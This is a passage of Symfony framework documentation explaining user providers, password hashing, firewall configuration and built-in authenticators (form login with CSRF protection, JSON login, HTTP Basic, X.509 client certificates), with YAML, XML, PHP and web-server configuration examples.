:doc:`Doctrine </doctrine>`;\n:ref:`LDAP User Provider <security-ldap-user-provider>`\n    Loads users from a LDAP server;\n:ref:`Memory User Provider <security-memory-user-provider>`\n    Loads users from a configuration file;\n:ref:`Chain User Provider <security-chain-user-provider>`\n    Merges two or more user providers into a new user provider.\n    Since each firewall has exactly *one* user provider, you can use this\n    to chain multiple providers together.\n\nThe built-in user providers cover the most common needs for applications, but you\ncan also create your own :ref:`custom user provider <security-custom-user-provider>`.\n\n.. note::\n\n    Sometimes, you need to inject the user provider in another class (e.g.\n    in your custom authenticator). All user providers follow this pattern\n    for their service ID: ``security.user.provider.concrete.<your-provider-name>``\n    (where ``<your-provider-name>`` is the configuration key, e.g.\n    ``app_user_provider``). If you only have one user provider, you can autowire\n    it using the :class:`Symfony\\\\Component\\\\Security\\\\Core\\\\User\\\\UserProviderInterface`\n    type-hint.\n\n.. _security-encoding-user-password:\n\nRegistering the User: Hashing Passwords\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nMany applications require a user to log in with a password. For these\napplications, the SecurityBundle provides password hashing and verification\nfunctionality.\n\nFirst, make sure your User class implements the\n:class:`Symfony\\\\Component\\\\Security\\\\Core\\\\User\\\\PasswordAuthenticatedUserInterface`::\n\n    // src/Entity/User.php\n\n    // ...\n    use Symfony\\Component\\Security\\Core\\User\\PasswordAuthenticatedUserInterface;\n\n    class User implements UserInterface, PasswordAuthenticatedUserInterface\n    {\n        // ...\n\n        /**\n         * @return string the hashed password for this user\n         */\n        public function getPassword(): string\n        {\n            return $this->password;\n        }\n    }\n\nThen, configure which password hasher should be used for this class. If your\n``security.yaml`` file wasn't already pre-configured, then ``make:user`` should\nhave done this for you:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/security.yaml\n        security:\n            # ...\n            password_hashers:\n                # Use native password hasher, which auto-selects and migrates the best\n                # possible hashing algorithm (which currently is \"bcrypt\")\n                Symfony\\Component\\Security\\Core\\User\\PasswordAuthenticatedUserInterface: 'auto'\n\n    .. code-block:: xml\n\n        <!-- config/packages/security.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <srv:container xmlns=\"http://symfony.com/schema/dic/security\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:srv=\"http://symfony.com/schema/dic/services\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/security\n                https://symfony.com/schema/dic/security/security-1.0.xsd\">\n\n            <config>\n                <!-- ... -->\n                <!-- Use native password hasher, which auto-selects and migrates the best\n                     possible hashing algorithm (currently this is \"bcrypt\") -->\n                <password-hasher class=\"Symfony\\Component\\Security\\Core\\User\\PasswordAuthenticatedUserInterface\" algorithm=\"auto\"/>\n            </config>\n        </srv:container>\n\n    .. code-block:: php\n\n        // config/packages/security.php\n        use App\\Entity\\User;\n        use Symfony\\Component\\Security\\Core\\User\\PasswordAuthenticatedUserInterface;\n\n        return static function (SecurityConfig $security): void {\n            // ...\n\n            // Use native password hasher, which auto-selects and migrates the best\n            // possible hashing algorithm (currently this is \"bcrypt\")\n            $security->passwordHasher(PasswordAuthenticatedUserInterface::class)\n                ->algorithm('auto')\n            ;\n        };\n\nNow that Symfony knows *how* you want to hash the passwords, you can use the\n``UserPasswordHasherInterface`` service to do this before saving your users to\nthe database::\n\n    // src/Controller/RegistrationController.php\n    namespace App\\Controller;\n\n    // ...\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\PasswordHasher\\Hasher\\UserPasswordHasherInterface;\n\n    class RegistrationController extends AbstractController\n    {\n        public function index(UserPasswordHasherInterface $passwordHasher): Response\n        {\n            // ... e.g. get the user data from a registration form\n            $user = new User(...);\n            $plaintextPassword = ...;\n\n            // hash the password (based on the security.yaml config for the $user class)\n            $hashedPassword = $passwordHasher->hashPassword(\n                $user,\n                $plaintextPassword\n            );\n            $user->setPassword($hashedPassword);\n\n            // ...\n        }\n    }\n\n.. note::\n\n    If your user class is a Doctrine entity and you hash user passwords, the\n    Doctrine repository class related to the user class must implement the\n    :class:`Symfony\\\\Component\\\\Security\\\\Core\\\\User\\\\PasswordUpgraderInterface`.\n\n.. _security-make-registration-form:\n\n.. tip::\n\n    The ``make:registration-form`` maker command can help you set-up the\n    registration controller and add features like email address\n    verification using the `SymfonyCastsVerifyEmailBundle`_.\n\n    .. code-block:: terminal\n\n        $ composer require symfonycasts/verify-email-bundle\n        $ php bin/console make:registration-form\n\nYou can also manually hash a password by running:\n\n.. code-block:: terminal\n\n    $ php bin/console security:hash-password\n\nRead more about all available hashers and password migration in\n:doc:`security/passwords`.\n\n.. _firewalls-authentication:\n.. _a-authentication-firewalls:\n\nThe Firewall\n------------\n\nThe ``firewalls`` section of ``config/packages/security.yaml`` is the *most*\nimportant section. A \"firewall\" is your authentication system: the firewall\ndefines which parts of your application are secured and *how* your users\nwill be able to authenticate (e.g. login form, API token, etc).\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/security.yaml\n        security:\n            # ...\n            firewalls:\n                # the order in which firewalls are defined is very important, as the\n                # request will be handled by the first firewall whose pattern matches\n                dev:\n                    pattern: ^/(_(profiler|wdt)|css|images|js)/\n                    security: false\n                # a firewall with no pattern should be defined last because it will match all requests\n                main:\n                    lazy: true\n                    # provider that you set earlier inside providers\n                    provider: app_user_provider\n\n                    # activate different ways to authenticate\n                    # https://symfony.com/doc/current/security.html#firewalls-authentication\n\n                    # https://symfony.com/doc/current/security/impersonating_user.html\n                    # switch_user: true\n\n    .. code-block:: xml\n\n        <!-- config/packages/security.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <srv:container xmlns=\"http://symfony.com/schema/dic/security\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:srv=\"http://symfony.com/schema/dic/services\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/security\n                https://symfony.com/schema/dic/security/security-1.0.xsd\">\n\n            <config>\n                <!-- ... -->\n\n                <!-- the order in which firewalls are defined is very important, as the\n                     request will be handled by the first firewall whose pattern matches -->\n                <firewall name=\"dev\"\n                    pattern=\"^/(_(profiler|wdt)|css|images|js)/\"\n                    security=\"false\"/>\n\n                <!-- a firewall with no pattern should be defined last because it will match all requests -->\n                <firewall name=\"main\"\n                    lazy=\"true\"/>\n\n                <!-- activate different ways to authenticate\n                     https://symfony.com/doc/current/security.html#firewalls-authentication -->\n\n                <!-- https://symfony.com/doc/current/security/impersonating_user.html -->\n                <!-- <switch-user/> -->\n            </config>\n        </srv:container>\n\n    .. code-block:: php\n\n        // config/packages/security.php\n        use Symfony\\Config\\SecurityConfig;\n\n        return static function (SecurityConfig $security): void {\n            // ...\n\n            // the order in which firewalls are defined is very important, as the\n            // request will be handled by the first firewall whose pattern matches\n            $security->firewall('dev')\n                ->pattern('^/(_(profiler|wdt)|css|images|js)/')\n                ->security(false)\n            ;\n\n            // a firewall with no pattern should be defined last because it will match all requests\n            $security->firewall('main')\n                ->lazy(true)\n\n                // activate different ways to authenticate\n                // https://symfony.com/doc/current/security.html#firewalls-authentication\n\n                // https://symfony.com/doc/current/security/impersonating_user.html\n                // ->switchUser(true)\n            ;\n        };\n\nOnly one firewall is active on each request: Symfony uses the ``pattern`` key\nto find the first match (you can also\n:doc:`match by host or other things </security/firewall_restriction>`).\nHere, all real URLs are handled by the ``main`` firewall (no ``pattern`` key means\nit matches *all* URLs).\n\nThe ``dev`` firewall is really a fake firewall: it makes sure that you\ndon't accidentally block Symfony's dev tools - which live under URLs like\n``/_profiler`` and ``/_wdt``.\n\n.. tip::\n\n    When matching several routes, instead of creating a long regex you can also\n    use an array of simpler regexes to match each route:\n\n    .. configuration-block::\n\n        .. code-block:: yaml\n\n            # config/packages/security.yaml\n            security:\n                # ...\n                firewalls:\n                    dev:\n                        pattern:\n                            - ^/_profiler/\n                            - ^/_wdt/\n                            - ^/css/\n                            - ^/images/\n                            - ^/js/\n            # ...\n\n        .. code-block:: php\n\n            // config/packages/security.php\n            use Symfony\\Config\\SecurityConfig;\n\n            return static function (SecurityConfig $security): void {\n                // ...\n                $security->firewall('dev')\n                    ->pattern([\n                        '^/_profiler/',\n                        '^/_wdt/',\n                        '^/css/',\n                        '^/images/',\n                        '^/js/',\n                    ])\n                    ->security(false)\n                ;\n\n                // ...\n            };\n\n    This feature is not supported by the XML configuration format.\n\nAll *real* URLs are handled by the ``main`` firewall (no ``pattern`` key means\nit matches *all* URLs). A firewall can have many modes of authentication,\nin other words, it enables many ways to ask the question \"Who are you?\".\n\nOften, the user is unknown (i.e. not logged in) when they first visit your\nwebsite. If you visit your homepage right now, you *will* have access and\nyou'll see that you're visiting a page behind the firewall in the toolbar:\n\n.. image:: /_images/security/anonymous_wdt.png\n   :alt: The Symfony profiler toolbar where the Security information shows \"Authenticated: no\" and \"Firewall name: main\"\n\nVisiting a URL under a firewall doesn't necessarily require you to be authenticated\n(e.g. the login form has to be accessible or some parts of your application\nare public). On the other hand, all pages that you want to be *aware* of a logged in\nuser have to be under the same firewall. So if you want to display a *\"You are logged in\nas ...\"* message on every page, they all have to be included in the same firewall.\n\nYou'll learn how to restrict access to URLs, controllers or\nanything else within your firewall in the :ref:`access control\n<security-access-control>` section.\n\n.. tip::\n\n    The ``lazy`` anonymous mode prevents the session from being started if\n    there is no need for authorization (i.e. explicit check for a user\n    privilege). This is important to keep requests cacheable (see\n    :doc:`/http_cache`).\n\n.. note::\n\n    If you do not see the toolbar, install the :doc:`profiler </profiler>`\n    with:\n\n    .. code-block:: terminal\n\n        $ composer require --dev symfony/profiler-pack\n\nFetching the Firewall Configuration for a Request\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you need to get the configuration of the firewall that matched a given request,\nuse the :class:`Symfony\\\\Bundle\\\\SecurityBundle\\\\Security` service::\n\n    // src/Service/ExampleService.php\n    // ...\n\n    use Symfony\\Bundle\\SecurityBundle\\Security;\n    use Symfony\\Component\\HttpFoundation\\RequestStack;\n\n    class ExampleService\n    {\n        public function __construct(\n            // Avoid calling getFirewallConfig() in the constructor: auth may not\n            // be complete yet. Instead, store the entire Security object.\n            private Security $security,\n            private RequestStack $requestStack,\n        ) {\n        }\n\n        public function someMethod(): void\n        {\n            $request = $this->requestStack->getCurrentRequest();\n            $firewallName = $this->security->getFirewallConfig($request)?->getName();\n\n            // ...\n        }\n    }\n\n.. _security-authenticators:\n\nAuthenticating Users\n--------------------\n\nDuring authentication, the system tries to find a matching user for the\nvisitor of the webpage. Traditionally, this was done using a login form or\na HTTP basic dialog in the browser. However, the SecurityBundle comes with\nmany other authenticators:\n\n* `Form Login`_\n* `JSON Login`_\n* `HTTP Basic`_\n* `Login Link`_\n* `X.509 Client Certificates`_\n* `Remote users`_\n* :doc:`Custom Authenticators </security/custom_authenticator>`\n\n.. tip::\n\n    If your application logs users in via a third-party service such as\n    Google, Facebook or Twitter (social login), check out the `HWIOAuthBundle`_\n    community bundle or `Oauth2-client`_ package.\n\n.. _security-form-login:\n\nForm Login\n~~~~~~~~~~\n\nMost websites have a login form where users authenticate using an\nidentifier (e.g. email address or username) and a password. This\nfunctionality is provided by the built-in :class:`Symfony\\\\Component\\\\Security\\\\Http\\Authenticator\\\\FormLoginAuthenticator`.\n\nYou can run the following command to create everything needed to add a login\nform in your application:\n\n.. code-block:: terminal\n\n    $ php bin/console make:security:form-login\n\nThis command will create the required controller and template and it will also\nupdate the security configuration. Alternatively, if you prefer to make these\nchanges manually, follow the next steps.\n\nFirst, create a controller for the login form:\n\n.. code-block:: terminal\n\n    $ php bin/console make:controller Login\n\n     created: src/Controller/LoginController.php\n     created: templates/login/index.html.twig\n\n.. code-block:: php\n\n    // src/Controller/LoginController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n\n    class LoginController extends AbstractController\n    {\n        #[Route('/login', name: 'app_login')]\n        public function index(): Response\n        {\n            return $this->render('login/index.html.twig', [\n                'controller_name' => 'LoginController',\n            ]);\n        }\n    }\n\nThen, enable the ``FormLoginAuthenticator`` using the ``form_login`` setting:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/security.yaml\n        security:\n            # ...\n\n            firewalls:\n                main:\n                    # ...\n                    form_login:\n                        # \"app_login\" is the name of the route created previously\n                        login_path: app_login\n                        check_path: app_login\n\n    .. code-block:: xml\n\n        <!-- config/packages/security.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <srv:container xmlns=\"http://symfony.com/schema/dic/security\"\n            xmlns:srv=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/security\n                https://symfony.com/schema/dic/security/security-1.0.xsd\">\n\n            <config>\n                <!-- ... -->\n                <firewall name=\"main\">\n                    <!-- \"app_login\" is the name of the route created previously -->\n                    <form-login login-path=\"app_login\" check-path=\"app_login\"/>\n                </firewall>\n            </config>\n        </srv:container>\n\n    .. code-block:: php\n\n        // config/packages/security.php\n        use Symfony\\Config\\SecurityConfig;\n\n        return static function (SecurityConfig $security): void {\n            // ...\n\n            $mainFirewall = $security->firewall('main');\n\n            // \"app_login\" is the name of the route created previously\n            $mainFirewall->formLogin()\n                ->loginPath('app_login')\n                ->checkPath('app_login')\n            ;\n        };\n\n.. note::\n\n    The ``login_path`` and ``check_path`` support URLs and route names (but\n    cannot have mandatory wildcards - e.g. ``/login/{foo}`` where ``foo``\n    has no default value).\n\nOnce enabled, the security system redirects unauthenticated visitors to the\n``login_path`` when they try to access a secured place (this behavior can\nbe customized using :ref:`authentication entry points <security-entry-point>`).\n\nEdit the login controller to render the login form:\n\n.. code-block:: diff\n\n      // ...\n    + use Symfony\\Component\\Security\\Http\\Authentication\\AuthenticationUtils;\n\n      class LoginController extends AbstractController\n      {\n          #[Route('/login', name: 'app_login')]\n    -     public function index(): Response\n    +     public function index(AuthenticationUtils $authenticationUtils): Response\n          {\n    +         // get the login error if there is one\n    +         $error = $authenticationUtils->getLastAuthenticationError();\n    +\n    +         // last username entered by the user\n    +         $lastUsername = $authenticationUtils->getLastUsername();\n    +\n              return $this->render('login/index.html.twig', [\n    -             'controller_name' => 'LoginController',\n    +             'last_username' => $lastUsername,\n    +             'error'         => $error,\n              ]);\n          }\n      }\n\nDon't let this controller confuse you. Its job is only to *render* the form.\nThe ``FormLoginAuthenticator`` will handle the form *submission* automatically.\nIf the user submits an invalid email or password, that authenticator will store\nthe error and redirect back to this controller, where we read the error (using\n``AuthenticationUtils``) so that it can be displayed back to the user.\n\nFinally, create or update the template:\n\n.. code-block:: html+twig\n\n    {# templates/login/index.html.twig #}\n    {% extends 'base.html.twig' %}\n\n    {# ... #}\n\n    {% block body %}\n        {% if error %}\n            <div>{{ error.messageKey|trans(error.messageData, 'security') }}</div>\n        {% endif %}\n\n        <form action=\"{{ path('app_login') }}\" method=\"post\">\n            <label for=\"username\">Email:</label>\n            <input type=\"text\" id=\"username\" name=\"_username\" value=\"{{ last_username }}\" required>\n\n            <label for=\"password\">Password:</label>\n            <input type=\"password\" id=\"password\" name=\"_password\" required>\n\n            {# If you want to control the URL the user is redirected to on success\n            <input type=\"hidden\" name=\"_target_path\" value=\"/account\"> #}\n\n            <button type=\"submit\">login</button>\n        </form>\n    {% endblock %}\n\n.. warning::\n\n    The ``error`` variable passed into the template is an instance\n    of :class:`Symfony\\\\Component\\\\Security\\\\Core\\\\Exception\\\\AuthenticationException`.\n    It may contain sensitive information about the authentication failure.\n    *Never* use ``error.message``: use the ``messageKey`` property instead,\n    as shown in the example. This message is always safe to display.\n\nThe form can look like anything, but it usually follows some conventions:\n\n* The ``<form>`` element sends a ``POST`` request to the ``app_login`` route, since\n  that's what you configured as the ``check_path`` under the ``form_login`` key in\n  ``security.yaml``;\n* The username (or whatever your user's \"identifier\" is, like an email) field has\n  the name ``_username`` and the password field has the name ``_password``.\n\n.. tip::\n\n    Actually, all of this can be configured under the ``form_login`` key. See\n    :ref:`reference-security-firewall-form-login` for more details.\n\n.. danger::\n\n    This login form is currently not protected against CSRF attacks. Read\n    :ref:`form_login-csrf` on how to protect your login form.\n\nAnd that's it! When you submit the form, the security system automatically\nreads the ``_username`` and ``_password`` POST parameter, loads the user via\nthe user provider, checks the user's credentials and either authenticates the\nuser or sends them back to the login form where the error can be displayed.\n\nTo review the whole process:\n\n#. The user tries to access a resource that is protected (e.g. ``/admin``);\n#. The firewall initiates the authentication process by redirecting the\n   user to the login form (``/login``);\n#. The ``/login`` page renders login form via the route and controller created\n   in this example;\n#. The user submits the login form to ``/login``;\n#. The security system (i.e. the ``FormLoginAuthenticator``) intercepts the\n   request, checks the user's submitted credentials, authenticates the user if\n   they are correct, and sends the user back to the login form if they are not.\n\n.. seealso::\n\n    You can customize the responses on a successful or failed login\n    attempt. See :doc:`/security/form_login`.\n\n.. _form_login-csrf:\n\nCSRF Protection in Login Forms\n..............................\n\n`Login CSRF attacks`_ can be prevented using the same technique of adding hidden\nCSRF tokens into the login forms. The Security component already provides CSRF\nprotection, but you need to configure some options before using it.\n\nFirst, you need to enable CSRF on the form login:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/security.yaml\n        security:\n            # ...\n\n            firewalls:\n                secured_area:\n                    # ...\n                    form_login:\n                        # ...\n                        enable_csrf: true\n\n    .. code-block:: xml\n\n        <!-- config/packages/security.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <srv:container xmlns=\"http://symfony.com/schema/dic/security\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:srv=\"http://symfony.com/schema/dic/services\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/security\n                https://symfony.com/schema/dic/security/security-1.0.xsd\">\n\n            <config>\n                <!-- ... -->\n\n                <firewall name=\"secured_area\">\n                    <!-- ... -->\n                    <form-login enable-csrf=\"true\"/>\n                </firewall>\n            </config>\n        </srv:container>\n\n    .. code-block:: php\n\n        // config/packages/security.php\n        use Symfony\\Config\\SecurityConfig;\n\n        return static function (SecurityConfig $security): void {\n            // ...\n\n            $mainFirewall = $security->firewall('main');\n            $mainFirewall->formLogin()\n                // ...\n                ->enableCsrf(true)\n            ;\n        };\n\n.. _csrf-login-template:\n\nThen, use the ``csrf_token()`` function in the Twig template to generate a CSRF\ntoken and store it as a hidden field of the form. By default, the HTML field\nmust be called ``_csrf_token`` and the string used to generate the value must\nbe ``authenticate``:\n\n.. code-block:: html+twig\n\n    {# templates/login/index.html.twig #}\n\n    {# ... #}\n    <form action=\"{{ path('app_login') }}\" method=\"post\">\n        {# ... the login fields #}\n\n        <input type=\"hidden\" name=\"_csrf_token\" data-controller=\"csrf-protection\" value=\"{{ csrf_token('authenticate') }}\">\n\n        <button type=\"submit\">login</button>\n    </form>\n\nAfter this, you have protected your login form against CSRF attacks.\n\n.. tip::\n\n    You can change the name of the field by setting ``csrf_parameter`` and change\n    the token ID by setting  ``csrf_token_id`` in your configuration. See\n    :ref:`reference-security-firewall-form-login` for more details.\n\n.. _security-json-login:\n\nJSON Login\n~~~~~~~~~~\n\nSome applications provide an API that is secured using tokens. These\napplications may use an endpoint that provides these tokens based on a\nusername (or email) and password. The JSON login authenticator helps you create\nthis functionality.\n\nEnable the authenticator using the ``json_login`` setting:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/security.yaml\n        security:\n            # ...\n\n            firewalls:\n                main:\n                    # ...\n                    json_login:\n                        # api_login is a route we will create below\n                        check_path: api_login\n\n    .. code-block:: xml\n\n        <!-- config/packages/security.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <srv:container xmlns=\"http://symfony.com/schema/dic/security\"\n            xmlns:srv=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/security\n                https://symfony.com/schema/dic/security/security-1.0.xsd\">\n\n            <config>\n                <!-- ... -->\n                <firewall name=\"main\">\n                    <json-login check-path=\"api_login\"/>\n                </firewall>\n            </config>\n        </srv:container>\n\n    .. code-block:: php\n\n        // config/packages/security.php\n        use Symfony\\Config\\SecurityConfig;\n\n        return static function (SecurityConfig $security): void {\n            // ...\n\n            $mainFirewall = $security->firewall('main');\n            $mainFirewall->jsonLogin()\n                ->checkPath('api_login')\n            ;\n        };\n\n.. note::\n\n    The ``check_path`` supports URLs and route names (but cannot have\n    mandatory wildcards - e.g. ``/login/{foo}`` where ``foo`` has no\n    default value).\n\nThe authenticator runs when a client requests the ``check_path``. First,\ncreate a controller for this path:\n\n.. code-block:: terminal\n\n    $ php bin/console make:controller --no-template ApiLogin\n\n     created: src/Controller/ApiLoginController.php\n\n.. code-block:: php\n\n    // src/Controller/ApiLoginController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n\n    class ApiLoginController extends AbstractController\n    {\n        #[Route('/api/login', name: 'api_login')]\n        public function index(): Response\n        {\n            return $this->json([\n                'message' => 'Welcome to your new controller!',\n                'path' => 'src/Controller/ApiLoginController.php',\n            ]);\n        }\n    }\n\nThis login controller will be called after the authenticator successfully\nauthenticates the user. You can get the authenticated user, generate a\ntoken (or whatever you need to return) and return the JSON response:\n\n.. code-block:: diff\n\n      // ...\n    + use App\\Entity\\User;\n    + use Symfony\\Component\\Security\\Http\\Attribute\\CurrentUser;\n\n      class ApiLoginController extends AbstractController\n      {\n    -     #[Route('/api/login', name: 'api_login')]\n    +     #[Route('/api/login', name: 'api_login', methods: ['POST'])]\n    -     public function index(): Response\n    +     public function index(#[CurrentUser] ?User $user): Response\n          {\n    +         if (null === $user) {\n    +             return $this->json([\n    +                 'message' => 'missing credentials',\n    +             ], Response::HTTP_UNAUTHORIZED);\n    +         }\n    +\n    +         $token = ...; // somehow create an API token for $user\n    +\n              return $this->json([\n    -             'message' => 'Welcome to your new controller!',\n    -             'path' => 'src/Controller/ApiLoginController.php',\n    +             'user'  => $user->getUserIdentifier(),\n    +             'token' => $token,\n              ]);\n          }\n      }\n\n.. note::\n\n    The ``#[CurrentUser]`` can only be used in controller arguments to\n    retrieve the authenticated user. In services, you would use\n    :method:`Symfony\\\\Bundle\\\\SecurityBundle\\\\Security::getUser`.\n\nThat's it! To summarize the process:\n\n#. A client (e.g. the front-end) makes a *POST request* with the\n   ``Content-Type: application/json`` header to ``/api/login`` with\n   ``username`` (even if your identifier is actually an email) and\n   ``password`` keys:\n\n   .. code-block:: json\n\n        {\n            \"username\": \"dunglas@example.com\",\n            \"password\": \"MyPassword\"\n        }\n#. The security system intercepts the request, checks the user's submitted\n   credentials and authenticates the user. If the credentials are incorrect,\n   an HTTP 401 Unauthorized JSON response is returned, otherwise your\n   controller is run;\n#. Your controller creates the correct response:\n\n   .. code-block:: json\n\n        {\n            \"user\": \"dunglas@example.com\",\n            \"token\": \"45be42...\"\n        }\n\n.. tip::\n\n    The JSON request format can be configured under the ``json_login`` key.\n    See :ref:`reference-security-firewall-json-login` for more details.\n\n.. _security-http_basic:\n\nHTTP Basic\n~~~~~~~~~~\n\n`HTTP Basic authentication`_ is a standardized HTTP authentication\nframework. It asks credentials (username and password) using a dialog in\nthe browser and the HTTP basic authenticator of Symfony will verify these\ncredentials.\n\nAdd the ``http_basic`` key to your firewall to enable HTTP Basic\nauthentication:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/security.yaml\n        security:\n            # ...\n\n            firewalls:\n                main:\n                    # ...\n                    http_basic:\n                        realm: Secured Area\n\n    .. code-block:: xml\n\n        <!-- config/packages/security.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <srv:container xmlns=\"http://symfony.com/schema/dic/security\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:srv=\"http://symfony.com/schema/dic/services\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/security\n                https://symfony.com/schema/dic/security/security-1.0.xsd\">\n\n            <config>\n                <!-- ... -->\n                <firewall name=\"main\">\n                    <http-basic realm=\"Secured Area\"/>\n                </firewall>\n            </config>\n        </srv:container>\n\n    .. code-block:: php\n\n        // config/packages/security.php\n        use Symfony\\Config\\SecurityConfig;\n\n        return static function (SecurityConfig $security): void {\n            $mainFirewall = $security->firewall('main');\n            $mainFirewall->httpBasic()\n                ->realm('Secured Area')\n            ;\n        };\n\nThat's it! Whenever an unauthenticated user tries to visit a protected\npage, Symfony will inform the browser that it needs to start HTTP basic\nauthentication (using the ``WWW-Authenticate`` response header). Then, the\nauthenticator verifies the credentials and authenticates the user.\n\n.. note::\n\n    You cannot use :ref:`log out <security-logging-out>` with the HTTP\n    basic authenticator. Even if you log out from Symfony, your browser\n    \"remembers\" your credentials and will send them on every request.\n\nLogin Link\n~~~~~~~~~~\n\nLogin links are a passwordless authentication mechanism. The user will\nreceive a short-lived link (e.g. via email) which will authenticate them to the\nwebsite.\n\nYou can learn all about this authenticator in :doc:`/security/login_link`.\n\nAccess Tokens\n~~~~~~~~~~~~~\n\nAccess Tokens are often used in API contexts.\nThe user receives a token from an authorization server\nwhich authenticates them.\n\nYou can learn all about this authenticator in :doc:`/security/access_token`.\n\nX.509 Client Certificates\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\nWhen using client certificates, your web server does all the authentication\nitself. The X.509 authenticator provided by Symfony extracts the email from\nthe \"distinguished name\" (DN) of the client certificate. Then, it uses this\nemail as user identifier in the user provider.\n\nFirst, configure your web server to enable client certificate verification\nand to expose the certificate's DN to the Symfony application:\n\n.. configuration-block::\n\n    .. code-block:: nginx\n\n        server {\n            # ...\n\n            ssl_client_certificate /path/to/my-custom-CA.pem;\n\n            # enable client certificate verification\n            ssl_verify_client optional;\n            ssl_verify_depth 1;\n\n            location / {\n                # pass the DN as \"SSL_CLIENT_S_DN\" to the application\n                fastcgi_param SSL_CLIENT_S_DN $ssl_client_s_dn;\n\n                # ...\n            }\n        }\n\n    .. code-block:: apache\n\n        # ...\n        SSLCACertificateFile \"/path/to/my-custom-CA.pem\"\n        SSLVerifyClient optional\n        SSLVerifyDepth 1\n\n        # pass the DN to the application\n        SSLOptions +StdEnvVars\n\n    .. code-block:: caddy\n\n        tls {\n            client_auth {\n                mode verify_if_given # check the Caddy documentation for more information\n                trusted_ca_cert_file /path/to/my-custom-CA.pem\n            }\n        }\n\n        route {\n            # Other configuration options go here\n\n            php_fastcgi unix//var/run/php/php-fpm.sock {\n                env SSL_CLIENT_S_DN {tls_client_subject}\n\n                # Environment variables for other certificate fields that you might need.\n                # They are not used by Symfony, but you can use them in your application.\n                # See all placeholders: https://caddyserver.com/docs/caddyfile/concepts#placeholders\n                env SSL_CLIENT_S_FINGERPRINT {tls_client_fingerprint}\n                env SSL_CLIENT_S_CERTIFICATE {tls_client_certificate_der_base64}\n                env SSL_CLIENT_S_ISSUER {tls_client_issuer}\n                env SSL_CLIENT_S_SERIAL {tls_client_serial}\n                env SSL_CLIENT_S_VERSION {tls_version}\n            }\n        }\n\nThen, enable the X.509 authenticator using ``x509`` on your firewall:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/security.yaml\n        security:\n            # ...\n\n            firewalls:\n                main:\n                    # ...\n                    x509:\n                        provider: your_user_provider\n\n    .. code-block:: xml\n\n        <!-- config/packages/security.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <srv:container xmlns=\"http://symfony.com/schema/dic/security\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:srv=\"http://symfony.com/schema/dic/services\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/security\n                https://symfony.com/schema/dic/security/security-1.0.xsd\">\n\n            <config>\n                <!-- ... -->\n\n                <firewall name=\"main\">\n                    <!-- ... -->\n                    <x509 provider=\"your_user_provider\"/>\n                </firewall>\n            </config>\n        </srv:container>\n\n    .. code-block:: php\n\n        // config/packages/security.php\n        use Symfony\\Config\\SecurityConfig;\n\n        return static function (SecurityConfig $security): void {\n            $mainFirewall = $security->firewall('main');\n            $mainFirewall->x509()\n                ->provider('your_user_provider')\n            ;\n        };\n\nBy default, Symfony extracts the email address from the DN in two different\nways:\n\n#. First, it tries the ``SSL_CLIENT_S_DN_Email`` server parameter, which is\n   exposed by Apache;\n#. If it is not set (e.g. when using Nginx), it uses ``SSL_CLIENT_S_DN`` and\n   matches the value following ``emailAddress``.\n\nYou can customize the name of some parameters under the ``x509`` key.\nSee :ref:`the x509 configuration reference <reference-security-firewall-x509>`\nfor more details.\n\nRemote Users\n~~~~~~~~~~~~\n\nBesides client certificate authentication, there are more web 